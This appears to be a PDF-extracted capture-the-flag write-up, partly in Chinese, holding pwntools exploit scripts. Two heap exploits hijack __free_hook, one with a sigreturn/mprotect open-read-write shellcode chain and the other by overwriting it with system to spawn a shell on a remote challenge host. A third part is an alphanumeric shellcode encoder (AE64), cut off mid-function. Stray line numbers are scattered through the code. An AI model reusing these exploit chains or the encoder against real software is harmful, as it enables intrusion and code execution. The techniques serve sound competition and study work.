sig.rsp = free_hook+0x10
sig.rbp = sig.rsp
sig.rip = mprotect
sig.rdi = free_hook&0xfffffffffffff000
sig.rsi = 0x1000
sig.rdx = 7
sig.csgsfs=0x2b000000000033
edit(0,str(sig))
shellcode = '''
mov rax,2
mov rdi,{sh}
mov rsi,0
syscall
xor rax,rax
mov rdi,3
mov rsi,{bss1}
mov rdx,0x300
syscall
mov rax,1
mov rdi,1
mov rsi,{bss2}
mov rdx,0x100
syscall
'''.format(sh=free_hook+0x100,bss1=free_hook-0x500,bss2=free_hook-0x500)
shellcode = asm(shellcode)
payload = p64(setcontext)+'./flag\x00\x00'+p64(free_hook+0x18)+shellcode
payload = payload.ljust(0x100,'\x90')
payload += "./flag\x00"
edit(2,payload)
# gdb.attach(s,"b free\nc")
free(0)
s.interactive()
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
pipeline
在 append 的时候输⼊ size 有⼀个类型混淆
输⼊ 0xffff1000 会产⽣溢出，利⽤ realloc(0)进⾏ free，很容易泄漏出 libc 地址。利⽤溢出控制下⼀块的 
ptr 即可任意地址写
from pwn import *
context.terminal = ['ancyterm', '-s', 'host.docker.internal', '-p', 
'15111', '-t', 'iterm2', '-e']
def cmd(idx):
    s.sendlineafter(">>",str(idx))
def new():
    cmd(1)
def edit(index,offset,size):
    cmd(2)
    s.sendlineafter("index: ",str(index))
    s.sendlineafter("offset: ",str(offset))
    s.sendlineafter("size: ",str(size))
def destory(idx):
    cmd(3)
    s.sendlineafter("index: ",str(index))
def append(idx,size,buf):
    cmd(4)
    s.sendlineafter("index: ",str(idx))
    s.sendlineafter("size: ",str(size))
    s.sendlineafter("data: ",buf)
def show(idx):
    cmd(5)
    s.sendlineafter("index: ",str(idx))
# s = process("./pipeline")
s = remote("59.110.173.239","2399")
new()#0
edit(0,0,0x500)
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
[强⽹先锋]shellcode
new()#1
new()#2
edit(0,0,0)
edit(0,0,0x500)
show(0)
# gdb.attach(s,"b *$rebase(0x1839)\nc")
libc = ELF("./libc-2.31.so")
libc.address = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00")-0x1ebbe0
success(hex(libc.address))
free_hook = libc.sym['__free_hook']
system = libc.sym['system']
append(0,0xffff1000,'A'*0x500+p64(0)+p64(0x21)+p64(free_hook)+p64(0)+p64(0x
100))
# gdb.attach(s,"b *$rebase(0x1839)\nc")
append(1,0xffff1000,p64(system))
append(0,0xffff1000,"/bin/sh\x00")
edit(0,0,0)
s.interactive()
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
#coding=utf8
from pwn import context,asm,success,shellcraft,debug
from pwn import *
context.arch = 'amd64'
class AE64():
  def __init__(self):
    self.alphanum = 
map(ord,list('UVWXYZABCDEFGHIJKLMNOPQRSTabcdefghijklmnopqrstuvwxyz01234567
89'))
    self.shift_tbl=[65,97,48,66,98,49,67,99,50,68,100,51,69,101,
            52,70,102,53,71,103,54,72,104,55,73,105,56,
            74,106,57,75,107,76,108,77,109,78,110,79,111,
            80,112,81,113,82,114,83,115,84,116,85,117,86,
            118,87,119,88,120,89,121,90,122]
    self.mul_cache={} # ⽤于缓存imul的结果
    self.mul_rdi=0 # ⽤于减少mul使⽤次数从⽽缩短shellcode
    self.nop = 'Q' # nop = asm('push rcx')
    self.nop2 = 'QY' # nop2 = asm('push rcx;pop rcx')
    self.init_encoder_asm = '''
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
    /* set encoder */
    /* 0x5658 x 0x30 == 0x103080 (53,128) r8 */
    /* 0x5734 x 0x30 == 0x1059c0 (89,192) r9 */
    /* 0x5654 x 0x5a == 0x1e5988 (89,136) r10 */
    /* 0x6742 x 0x64 == 0x2855c8 (85,200) rdx */
    push   0x30
    push   rsp
    pop    rcx
    imul   di,WORD PTR [rcx],0x5658
    push   rdi
    pop    r8 /* 0x3080 */
    imul   di,WORD PTR [rcx],0x5734
    push   rdi
    pop    r9 /* 0x59c0 */
    push   0x5a
    push   rsp
    pop    rcx
    imul   di,WORD PTR [rcx],0x5654
    push   rdi
    pop    r10 /* 0x5988 */
    push   0x64
    push   rsp
    pop    rcx
    imul   di,WORD PTR [rcx],0x6742
    push   rdi
    pop    rdx /* 0x55c8 */
    '''
    # self.init_encoder = asm(self.init_encoder_asm)
    self.init_encoder = 'j0TYfi9XVWAXfi94WWAYjZTYfi9TVWAZjdTYfi9BgWZ'
    self.zero_rdi_asm='''
    push rdi
    push rsp
    pop rcx
    xor rdi,[rcx]
    pop rcx
    '''
    # self.zero_rdi = asm(self.zero_rdi_asm)
    self.zero_rdi = 'WTYH39Y'
    self.vaild_reg = ['rax','rbx','rcx','rdx','rdi','rsi','rbp','rsp',
            'r8','r9','r10','r11','r12','r13','r14','r15']
  def encode(self,raw_sc,addr_in_reg='rax',pre_len=0,is_rdi_zero=0):
    r'''
    raw_sc：需要encode的机器码
    addr_in_reg: 指向shellcode附近的寄存器名称，默认rax
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
    pre_len：因为默认rax指向shellcode附近，这个字段的意思为 reg+pre_len == 
encoder的起始地址，默认0
    is_rdi_zero: 跑shellcode之前rdi是否为0，如果确定为0,可以设置此flag为1，这样可
以省去⼏byte空间，默认0即rdi不为0
    encoder_len：留给encoder的最⼤字节⻓度(会⾃动调整)
    地址构成：
    rax --> xxxxx  \
        xxxxx  | pre_len (adjust addr to rax)
        xxxxx  /
    encoder yyyyy  \
        yyyyy  | encoder_len
        yyyyy  /
    your_sc zzzzz  \
        zzzzz  | encoded shellcode
        zzzzz  |
        zzzzz  /
    '''
    save_log_level = context.log_level
    context.log_level = 99
    if not is_rdi_zero:
      self.prologue = self.zero_rdi+self.init_encoder
    else:
      self.prologue = self.init_encoder
    addr_in_reg=addr_in_reg.lower()
    if addr_in_reg != 'rax':
      if addr_in_reg not in self.vaild_reg:
        print '[-] not vaild reg'
        return None
      else:
        self.prologue=asm('push {};pop 
rax;\n'.format(addr_in_reg))+self.prologue
    self.raw_sc = raw_sc
    self.pre_len = pre_len
    self.encoder_len=len(self.prologue)
    if not self.encode_raw_sc():
      print '[-] error while encoding raw_sc'
      return None
    while True:
      debug('AE64: trying length {}'.format(self.encoder_len))
      encoder = asm(self.gen_encoder(self.pre_len+self.encoder_len))
      final_sc = self.prologue+encoder
      if self.encoder_len >= len(final_sc) and self.encoder_len-
len(final_sc)  prologue:{} + encoder:{} 
+ nop:{} + encoded_sc:{} == {}'.format(
      len(self.prologue),
      len(final_sc)-len(self.prologue),
      nop_len,
      len(self.enc_raw_sc),
      len(final_sc)+nop_len+len(self.enc_raw_sc)))
    final_sc += self.nop2*(nop_len/2)+self.nop*(nop_len%2)+self.enc_raw_sc
    return final_sc
  def encode_raw_sc(self):
    '''
    计算encode后的shellcode，以及需要的加密步骤(encoder)
    '''
    reg=['rdx','r8','r9','r10']
    dh=[0x55,0x30,0x59,0x59]
    dl=[0xc8,0x80,0xc0,0x88]
    tmp_sc=list(self.raw_sc)
    # 帮助后续⽣成encoder。
    # 由三部分组成：
    # 寄存器所提供地址和所要加密字节的偏移；⽤到的寄存器；是⾼8字节(dh)还是低8字节(dl)
    encoder_info=[]
    for i in range(len(self.raw_sc)):
      oc = ord(self.raw_sc[i])
      if oc not in self.alphanum: # 不是alphanumeric才需要加密
        for j,n in enumerate(dh if oc < 0x80 else dl):
          if oc^n in self.alphanum:
            tmp_sc[i] = chr(oc^n)
            encoder_info.append((i,reg[j],1 if oc < 0x80 else 0))
            break
    self.enc_raw_sc = ''.join(tmp_sc)
    self.encoder_info = encoder_info
    return 1
  def find_mul_force(self,need):
    '''
    ⽤于查找所需word如何由两个数相乘＆0xffff得到
    '''
    result_cache = self.mul_cache.get(need)
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
    if result_cache:
      return result_cache
    for h in self.alphanum:
      for l in self.alphanum: